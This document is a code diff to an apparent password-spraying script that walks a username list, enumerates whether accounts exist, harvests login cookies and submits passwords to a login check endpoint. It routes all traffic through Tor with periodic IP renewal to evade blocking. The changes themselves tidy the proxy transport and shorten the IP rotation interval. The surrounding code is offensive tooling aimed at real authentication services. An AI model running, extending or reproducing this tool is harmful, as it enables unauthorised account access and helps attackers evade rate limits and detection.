@@ -51,7 +51,7 @@ proxies = None
 def get_tor_ip():
     try:
         with httpx.Client(transport=transport, timeout=20) as client:
-            ip = client.get("https://api.ipify.org").text.strip()
+            ip = client.get("https://check.torproject.org/api/ip").text.strip()
             print(f"{BLUE}[i] Current TOR IP: {ip}{RESET}")
     except Exception as e:
         print(f"{RED}[✗] Could not retrieve TOR IP: {e}{RESET}")
@@ -70,7 +70,7 @@ def renew_tor_ip():
 
 if args.proxytor:
     last_ip_renewal = time.time()
-    renew_interval = 420
+    renew_interval = 300
     proxies = "socks5h://127.0.0.1:9050"
     transport = httpx.HTTPTransport(proxy=proxies)
     get_tor_ip()  
@@ -108,11 +108,10 @@ for username in usernames:
             }
             
             try:
-                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
+                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                     response_login = client.get(url_login)
                     cookies_dict_login = dict(response_login.cookies)
                     cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
-
                     for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                         globals()[f"cookie_login{i}"] = cookie_login
                         #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
@@ -140,7 +139,7 @@ for username in usernames:
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             }
             try: 
-                with httpx.Client(proxies=proxies, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
+                with httpx.Client(transport=transport, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                     response_geturls = client.get(url_geturls)
                     location = response_geturls.headers.get("location")
                     if not location:
@@ -185,7 +184,7 @@ for username in usernames:
                 "Priority": "u=0, i"
             }
             try: 
-                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
+                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                     response2 = client.get(url1)
                     cookies_dict2 = dict(response2.cookies)
                     cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
@@ -193,7 +192,7 @@ for username in usernames:
                         globals()[f"cookie_url1{i}"] = cookie2
                         #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")
 
-                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
+                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                     response3 = client.get(url2)
                     cookies_dict3 = dict(response3.cookies)
                     cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
@@ -253,7 +252,7 @@ for username in usernames:
             try: 
                 if args.check:
                     try:
-                        with httpx.Client(proxies=proxies, timeout=20, http2=True ) as client:
+                        with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                             response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                             if '"FederationRedirectUrl"' in response_UserExsit.text:
                                 print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
@@ -313,7 +312,7 @@ for username in usernames:
             
             try: 
                 try:
-                    with httpx.Client(proxies=proxies, timeout=20, http2=True ) as client:
+                    with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                         response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                         cookies_dict = dict(response_check_password.cookies)
                         if args.check:
@@ -406,7 +405,7 @@ for username in usernames:
                         print(f"{var_name}: not found")
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{RED}[✗] Timeout occurred while connecting to {url_login}{RESET}")
             except httpx.RequestError as e:
                 print(f"{RED}[✗] Request error: {e}{RESET}")
             except Exception:
